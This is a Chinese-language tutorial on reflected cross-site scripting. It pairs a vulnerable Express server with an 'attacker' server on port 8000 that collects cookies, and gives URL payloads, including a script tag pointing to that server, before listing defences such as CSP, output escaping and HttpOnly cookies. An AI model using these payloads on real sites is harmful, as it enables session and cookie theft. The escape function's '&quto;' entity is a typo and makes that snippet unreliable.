## 什么是 XSS

Cross Site Scripting 跨站脚本攻击

通过浏览器地址插入 `JavaScript` 脚本

+ 用来盗取用户 cookie 信息





## 开启两个服务

+ 正常服务 3000 端口
+ 黑客服务 8000 端口



**正常服务3000端口**

```js
const express = require('express');
const cors = require('cors');
const app = express();

// 解决跨域
app.use(cors());  


app.get("/", (req, res) => {
    console.log(req.query.from);
    const data = {
        code: 200,
        msg: "登录成功",
        data: req.query.from
    }
    res.status(200).send(JSON.stringify(data))
});

app.listen(3000, () => {
    console.log('http://localhost:3000/')
})
```



**黑客服务8000端口**

```js
const express = require('express');
const cors = require('cors');
const { json } = require('express');
const app = express();

//  不加上这句代码跨域访问时会出现错误，加上就不会出现跨域错误情况
app.use(cors());


app.get("/", (req, res) => {
    console.log(req.headers.cookie);
    const data = {
        code: 200,
        msg: "登录成功",
        data: req.headers.cookie
    }
    res.status(200).send(req.headers.cookie)
});

app.listen(8000, () => {
    console.log('http://localhost:8000/')
})
```



## 测试

**普通访问**

```
- 地址：http://localhost:3000/?from=china
- 3000 服务打印 china
```



**alert尝试访问**

```
- 地址: http://localhost:3000/?from=<script>alert(3)</script>

- 3000 服务打印 <script>alert(3)</script>
- 浏览器 alert
```



**获取Cookie访问**

```
- 浏览器访问 3000 端口服务
- 浏览器控制台: document.cookie="kaikeba:sess=eyJ1c2VybmFtZSI6Imxhb3dhbmciLCJfZXhwaXJlIjoxNTUzNTY1MDAxODYxLCJfbWF4QWdlIjo4NjQwMDAwMH0="
```

```
- 地址：http://localhost:3000/?from=<script src="http://localhost:8000"></script>

- 3000 服务 <script src='http://localhost:8000'></script>
- 8000 服务 显示 cookie
```



## 防范手段

+ `X-XSS-Protection`  设置为 0 

+ `csp`  内容安全策略` (CSP, Content Security Policy)`

  ```js
  // 只允许加载本站资源
  Content-Security-Policy: default-src 'self'
  // 只允许加载 HTTPS 协议图片
  Content-Security-Policy: img-src https://*
  // 不允许加载任何来源框架
  Content-Security-Policy: child-src 'none'
  ```

+ 黑名单转义

  用户的输入永远不可信任的，最普遍的做法就是转义输入输出的内容，对于引号、尖括号、斜杠进行转义

  ```js
  function escape(str) {
  	str = str.replace(/&/g, '&amp;')
  	str = str.replace(/</g, '&lt;')
  	str = str.replace(/>/g, '&gt;')
  	str = str.replace(/"/g, '&quto;')
  	str = str.replace(/'/g, '&#39;')
  	str = str.replace(/`/g, '&#96;')
  	str = str.replace(/\//g, '&#x2F;')
  	return str
  }
  ```

+ 白名单转义

  用于富文本处理

+ `HttpOnly Cookie`

  这是预防 XSS 攻击窃取用户 cookie 最有效的防御手段。Web 应用程序在设置 cookie 时，将其属性设为 HttpOnly，就可以避免该网页的 cookie被客户端恶意 JavaScript 窃取，保护用户 cookie 信息。

  ```js
  response.addHeader("Set-Cookie", "uid=112; Path=/; HttpOnly")
  ```

  